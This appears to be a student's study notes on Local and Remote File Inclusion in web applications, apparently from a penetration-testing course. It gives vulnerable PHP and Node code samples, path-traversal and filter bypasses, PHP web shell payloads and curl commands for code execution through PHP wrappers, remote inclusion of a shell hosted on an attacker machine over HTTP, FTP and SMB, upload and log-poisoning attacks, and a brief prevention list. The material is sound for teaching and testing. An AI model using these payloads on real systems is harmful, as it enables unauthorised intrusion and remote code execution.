## Local File Inclusion (LFI)
Many modern languages use parameters to pick the content to be displayed on the page.
The most common place to find ***LFI*** is in a template engine.
Templating engine displays a page that shows common static parts and then dynamically loads other content. 

We often see parameters like ***/index.php?page=about***, where `index.php` sets static content and pulls the dynamic content from `about.php`

### Examples of Vulnerable Code
a file could have content based on the user-specified input. a page may have a `?language` parameter. The parameter may change the directory the web app is being loaded from. 
If we have control over the path being loaded then we may be able to exploit the vulnerability, read other files and potentially reach RCE.

#### PHP
In PHP we may use the `include()` function to load a local or remote file. If the path is passed from a user controlled parameter without validation then its vulnerable to File Inclusion.
```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

#### NodeJS
Get Parameter passed direct to readFile function.
```javascript
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```

Another Example where parameter is taken from URL path.
```js
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});
```

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|`file_get_contents()`|✅|❌|✅|
|`fopen()`/`file()`|✅|❌|❌|
|**NodeJS**||||
|`fs.readFile()`|✅|❌|❌|
|`fs.sendFile()`|✅|❌|❌|
|`res.render()`|✅|✅|❌|
|**Java**||||
|`include`|✅|❌|❌|
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.Partial()`|✅|❌|❌|
|`@Html.RemotePartial()`|✅|❌|✅|
|`Response.WriteFile()`|✅|❌|❌|
|`include`|✅|✅|✅|
## LFI 
### Basic LFI
URL Includes Language Parameter and is set to *es.php*
it may pull content from a different database table based on parameter or it may be loading an entirely different version of the WebApp.

If the web application is pulling a file we can then read `/etc/passwd` and `C:\Windows\boot.ini`
***REMEMBER NOT EVERYTHING IS LINUX, INFACT UNLIKELY TO BE LINUX***
### Path Traversal 
Earlier example uses absolute paths and would only work if it was used within a function without any additions. 

```php
include("./languages/" . $_GET['language']);
```

If we use `/etc/password` the end result would be `./languages//etc/password` and error out and lead to nowhere.
We have to traverse paths with `../`
We don't know what path we're in so use a lot of `../` if we attempt to `../` when we are in the system file it wont go anywhere.

Always try to find the minimum number of `../` when writing a report and you may also use it to calculate how many directories are from root
IE if its 3 we may be in `/var/www/html/`

### Filename Prefix
on some occasions our input may be appended to a different string to get a full filename 
```php
include("lang_" . $_GET['language']);
```
if our url is` www.website.com/index.php?language=en` the file wold be `lang_en`

if we use our previous example the final string would be `lang_/etc/passwd`
because of this we can add a prefix of `/` before our payload to bypass the filename and traverse directories.

### Append Extensions 
Another common example is when an extension is appended to the language parameter. 
```php
include($_GET['language'] . ".php");
```
our input would then have `.php` appended to it.
if we tried to read `/etc/passwd` then it would be `/etc/passwd.php` which doesnt exist.

### Second-Order Attacks
Occurs when websites may be insecurely pulling files from back-end server based on user-controlled parameters. 

If a website allows us to download our profile picture from `/profile/$username/profile`
we can then craft a malicious username and it may be possible to pull another local file rather than our image.
In this case we would be *Poisoning* a database with a malicious payload.


## Basic Bypasses

### Non-Recursive Path Traversal filters
A common way of filtering paths is 
```php
$language = str_replace('../', '', $_GET['language']);
```
this will find and replace the `../` string with nothing and will render standard LFI useless.

This filter is insecure as it is not recursively removing the traversal strings.
To get around this we would simply need to use `....//` it would remove ..***../***/ leaving us `../`

### Encoding
Some web filters may block `.` and `/` from parameters. It is possible we can bypass this with url encoding 
	turning `../` into `%2e%2e%2F`

PHP filters on 5.3.4 and below are vulnerable to this.
Some custom written filters may not filter out this and they may have forgotten to implement protections.

### Approved Paths
Some applications use regex to ensure the file is being loaded from a certain path.
These custom written filters may still be vulnerable 
Code: php

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

To get around this we need to ***FUZZ*** for where approved files are being kept and start our payload with the approved path.

### Appended Extension
When an extension is appended to our input string we may bypass this on PHP 5.3.4 or earlier.
There may be some bypasses

#### Path Truncation
In earlier versions of PHP, defined strings have a limit of 4096 `due to limitations of 32bit systems`characters so we just fill the rest of the file name with `/./` 
```url
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```
So we would have a file name without the extension.

#### Null Bytes
Earlier versions of PHP (before 5.5) were vulnerable to null byte injection `%00`
Will terminate string ``/etc/passwd%00.php`` so `.php` is cut off

## PHP Filters
If we discover a LFI in a PHP web app we can use PHP wrappers to extend our LFI exploit and potentially reach RCE.

### Input Filters
PHP Filters are a type of wrapper that we can pass different input types into to access different IO streams.
we use`php://` in our string and can access the PHP filter wrapper with `php://`

### Fuzzing For PHP files
first step is to ***FUZZ*** for for available PHP files. 
As it is arbitrary we have access to all `301, 302, 402` files codes not just 200.

after reading the sources of any identified files, we can `scan them for other referenced PHP files`, and then read those as well

### Standard PHP Inclusion
PHP files that do not render HTML content would be unreadable if the website displays them as HTML.
We need to then encode the file with base64 to decode it locally.

We can do this with 
```url
php://filter/read=convert.base64-encode/resource=config.php
```

## PHP Wrappers
PHP wrappers as discussed previously could allow us RCE on a machine.
Once common method would be to enumerate back end user credentials and SSH keys to use those to log into the back-end.
There are also ways to achieve RCE via vulnerable functions.

### Data
The data wrapper can be used to include external data, including PHP code.
The data wrapper is only allowed to be used when `allow_url_include` is turned on in the php config settings.

>PHP configuration file found at `/etc/php/X.Y/apache2/php.ini` for Apache or at `/etc/php/X.Y/fpm/php.ini` for Nginx, where `X.Y` is your install PHP version

***To effectively do this exploit we need to FUZZ or fingerprint for the version number and server software***

```shell-session
allow_url_include = On
```
#### RCE 
With `allow_url_include = On ` enabled we can then proceed with our data wrapper attack.

A possible step is to base64 encode a web shell and we can then 
```shell-session
Retrosoda@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

We can then url our payload and add it to the `data://text/plain;base64,`
*EXAMPLE*

```http
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```
```shell-session
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```
### Input
Input wrapper can be used to include external PHP Code.
`input://`
the main difference is that we must `POST` our data to the input wrapper so the application must accept `POST` requests. 

```shell-session
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

### Expect 
Expect wrapper can be used to allow us to run commands through the URL stream. 
Expect wrapper has to be manually installed and enabled on back-end.
Some apps rely on it so it may be present in a few cases.

We can check if its installed on the backend by searching for `extension=expect`
```
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

## Remote File Inclusion
We may be able to include remote files, this provides two main benefits
1. Enumerating Local Ports and Web-Applications (SSRF)
2. Gaining remote code execution by including a malicious script that we host.

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`file_get_contents()`|✅|❌|✅|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.RemotePartial()`|✅|❌|✅|
|`include`|✅|✅|✅|
Almost any RFI vulnerability is a LFI vulnerability.
***CHECK Source code if we have a LFI***

an LFI may not necessarily be an RFI. This is primarily because of three reasons:

1. The vulnerable function may not allow including remote URLs
2. You may only control a portion of the filename and not the entire protocol wrapper (ex: `http://`, `ftp://`, `https://`).
3. The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.

possible to check for LFI in PHP configs
```shell-session
allow_url_include = On
```
Setting may not always be accurate.
Test for content local content then test for firewalls and external content.

Able to access local servers by applying SSRF to it.

### Remote Code Execution
Create a local shell
```shell-session
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
and host on local server.

We can now include and execute commands from importing our local shell.
```
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```
### FTP
Incase some http ports blocked by a firewall we can use a locally hosted FTP server to get files from.
```shell-session
sudo python -m pyftpdlib -p 21
```
Then we can use the RFI FTP:// protocol 
```
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```
PHP server attempts to authenticate as an anonymous user but they can be supplied with basic authentication `i.e ftp://username:password` 

### SMB
If vulnerable app is hosted on a windows server we can we do not need the `allow_url` setting to be turned on due to windows SMB protocol. Windows SMB protocol allows external files to be treated like they're on the  current machine.

we can spin up an SMB server using `Impacket's smbserver.py`
```shell-session
impacket-smbserver -smb2support share $(pwd)
```

```
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

## LFI FIle uploads
File upload vulnerabilities are ubiquitous due to people configuring profiles, settings.

Possible to create webshells or upload malicious PHP code disguised as another file and use LFI to execute it. 

### Zip Wrapper
Possible to ZIP files and use the PHP zip wrapper to access files inside
```
#Webshell called shell.php zipped inside a shell.jpg 
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id

```
Zip wrapper has to be enabled so may not work by default.

### PHAR wrapper
we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg` as follows:

```shell-session
Retrosoda@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

then possible to access via:
```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

***NEEDS VULNERABLE FILE UPLOAD POSSIBLE TO CHAIN***

## Log Poisoning
Writing PHP code into a field that we control that gets logged in the server and the log file with execute the PHP code is called log poisoning.

### PHP Session Poisoning
###### Needs LFI
Most PHP apps use PHP session IDS to hold specific user data on the back end 

Found in `/var/lib/php/sessions` on linux and `C:\Windows\Temp\` on windows machines.

The name of the file that contains our user's data matches our PHP-SESSION-ID cookie. with the sess_ prefix.

For example, if the `PHPSESSID` cookie is set to `el4ukv0kqbvoirg7nkp4dncpk3`, then its location on disk would be `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

We must examine `PHPSESSID` cookie and see if it contains any data we understand, control and poison. To do this we include it with out local file inclusion bug.

Could contain reference to current page which we can inject our own code and poison the session file.

We can then write a PHP web shell and and write the code to our session file. 

```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

We can then use LFI to include our session file for RCE using it like we would with any other web shell.

The session log has to then be reset after one file execution as 

### Server Log Poisoning
Apache and NGINX servers have log files `error.log access.log`
access.log file has 
By default logs on 
	nginx servers are readable by low level users ie `www-data` and stored in
		Linux: `/var/log/nginx`
		Windows: `C:\nginx\log` 
	Apache logs are only readable by  `root/adm` and stored in 
		 Linux:  `/var/log/apache2`
		 Windows: `C:\xampp\apache\logs`

Logs may differ in location so may need a LFI Word list to FUZZ for them

*Logs Tend to be huge so loading them into a LFI may take a while or even crash the server*

HTTP Request variables may be included in server log files most commonly `User-Agent`

If this is the case then we can poison the log by changing our `User-Agent` to a PHP web shell.

If the log contains PHP code and we can reference it with LFI then it can be used like any other web shell.
*IF Files contain php code and are rendered by the server, they act as if the whole program is in there. PHP usually has some HTML included so it is normally like  this*

>**Tip:** The `User-Agent` header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files.

*Other Similiar Log Files*
- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`
If SSH or FTP services are exposed to us we can login with a username of PHP code and read their logs which would then act as valid PHP code.

## Automated Scanning
Seclists has a wordlist for fuzzing LFI

### Parameter Fuzzing
We can fuzz parameters with Burp's Parameter fuzzing wordlist in SecLists
once we identify an exposed parameter that isn't linked to any forms we can then test.

***Most Popular 25***
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```

Other LFI wordlists in SecLists have common bypasses. Once we have identified the payload we should manually test them to make sure they work. 

### Fuzzing server files
Once we have access to LFI we may need to know the full server webroot path to complete our exploitation. We may not be able to access the directory through a relative file path`../` 
We can fuzz for the default webroot using SecLists
	`SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt`

### Server-Logs and Configurations
`Seclists/fuzzing/LFI/LFI-Jhadix.txt` for server logs and configurations.

for a more precise scan, we can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)

## Prevention
- Avoid passing user controlled parameters into any file inclusion API's 
- Use programming language to pull only file name and not path.
- Docker
- WAF
- Lock Web applications to their web root directory
- php.ini `allow_url_fopen` `allow_url_include` Off
















